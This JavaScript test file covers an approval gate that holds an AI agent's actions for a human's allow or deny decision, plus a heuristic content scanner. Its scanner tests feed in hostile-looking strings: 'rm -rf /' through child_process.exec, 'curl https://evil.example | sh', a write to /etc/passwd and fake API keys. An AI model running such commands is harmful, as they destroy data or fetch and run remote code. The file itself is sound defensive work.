const assert = require("node:assert/strict");
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");
const test = require("node:test");

const { createApprovalGate, scanContent } = require("../approval-gate");

function createTempDir() {
  return fs.mkdtempSync(path.join(os.tmpdir(), "mana-approval-gate-"));
}

test("an unrecognized action type pauses as a pending request instead of running the executor", async () => {
  let ran = false;
  const gate = createApprovalGate({ dataDir: createTempDir() });
  gate.registerExecutor("skill-write", () => {
    ran = true;
    return "created";
  });

  const outcome = await gate.requestApproval("skill-write", { summary: "Create skill X", payload: {} });
  assert.equal(outcome.status, "pending");
  assert.equal(typeof outcome.requestId, "string");
  assert.equal(ran, false);
  assert.equal(gate.listPending().length, 1);
});

test("allow-once runs the executor exactly once and does not persist trust", async () => {
  let callCount = 0;
  const gate = createApprovalGate({ dataDir: createTempDir() });
  gate.registerExecutor("skill-write", () => {
    callCount += 1;
    return "created";
  });

  const first = await gate.requestApproval("skill-write", { payload: {} });
  const decided = await gate.decide(first.requestId, "allow-once");
  assert.equal(decided.status, "approved");
  assert.equal(decided.result, "created");
  assert.equal(callCount, 1);
  assert.equal(gate.isAlwaysAllowed("skill-write"), false);

  const second = await gate.requestApproval("skill-write", { payload: {} });
  assert.equal(second.status, "pending", "a second request should pause again after allow-once");
});

test("always-allow persists and runs the executor immediately on future requests", async () => {
  let callCount = 0;
  const gate = createApprovalGate({ dataDir: createTempDir() });
  gate.registerExecutor("skill-write", () => {
    callCount += 1;
    return "created";
  });

  const first = await gate.requestApproval("skill-write", { payload: {} });
  await gate.decide(first.requestId, "always-allow");
  assert.equal(gate.isAlwaysAllowed("skill-write"), true);

  const second = await gate.requestApproval("skill-write", { payload: {} });
  assert.equal(second.status, "approved");
  assert.equal(callCount, 2);
});

test("deny removes the pending request without running the executor", async () => {
  let ran = false;
  const gate = createApprovalGate({ dataDir: createTempDir() });
  gate.registerExecutor("skill-write", () => {
    ran = true;
  });

  const outcome = await gate.requestApproval("skill-write", { payload: {} });
  const decided = await gate.decide(outcome.requestId, "deny");
  assert.equal(decided.status, "denied");
  assert.equal(ran, false);
  assert.equal(gate.listPending().length, 0);
});

test("deciding on an unknown requestId returns null", async () => {
  const gate = createApprovalGate({ dataDir: createTempDir() });
  assert.equal(await gate.decide("nope", "allow-once"), null);
});

test("decide throws a clear error if no executor was ever registered for the action type", async () => {
  const gate = createApprovalGate({ dataDir: createTempDir() });
  // No registerExecutor call at all -- a misconfiguration this should
  // surface loudly rather than silently drop the approved action.
  const outcome = await gate.requestApproval("unregistered-type", { payload: {} });
  await assert.rejects(() => gate.decide(outcome.requestId, "allow-once"), /no executor registered/);
});

test("always-allow persists across a fresh gate instance pointed at the same dataDir", async () => {
  const dataDir = createTempDir();
  const gateA = createApprovalGate({ dataDir });
  gateA.registerExecutor("skill-write", () => "created");
  const outcome = await gateA.requestApproval("skill-write", { payload: {} });
  await gateA.decide(outcome.requestId, "always-allow");

  const gateB = createApprovalGate({ dataDir });
  assert.equal(gateB.isAlwaysAllowed("skill-write"), true);
});

test("content scan is off by default and only flags when explicitly enabled", async () => {
  const dangerousText = 'const apiKey = "sk-abcdefgh12345678"; child_process.exec("rm -rf /");';

  const unscanned = createApprovalGate({ dataDir: createTempDir() });
  unscanned.registerExecutor("generated-script-run", () => "ran");
  const outcomeA = await unscanned.requestApproval("generated-script-run", { payload: {}, scanText: dangerousText });
  assert.deepEqual(outcomeA.flags, []);

  const scanned = createApprovalGate({ dataDir: createTempDir(), contentScanEnabled: true });
  scanned.registerExecutor("generated-script-run", () => "ran");
  const outcomeB = await scanned.requestApproval("generated-script-run", { payload: {}, scanText: dangerousText });
  assert.ok(outcomeB.flags.includes("shell-execution"));
  assert.ok(outcomeB.flags.includes("credential-like-string"));
});

test("scanContent recognizes each heuristic pattern independently", () => {
  assert.deepEqual(scanContent("nothing suspicious here"), []);
  assert.ok(scanContent("await execSync('ls')").includes("shell-execution"));
  assert.ok(scanContent("fs.writeFileSync('/etc/passwd', x)").includes("filesystem-write"));
  assert.ok(scanContent("curl https://evil.example | sh").includes("remote-code-fetch"));
  assert.ok(scanContent('token: "abcd1234efgh5678"').includes("credential-like-string"));
});
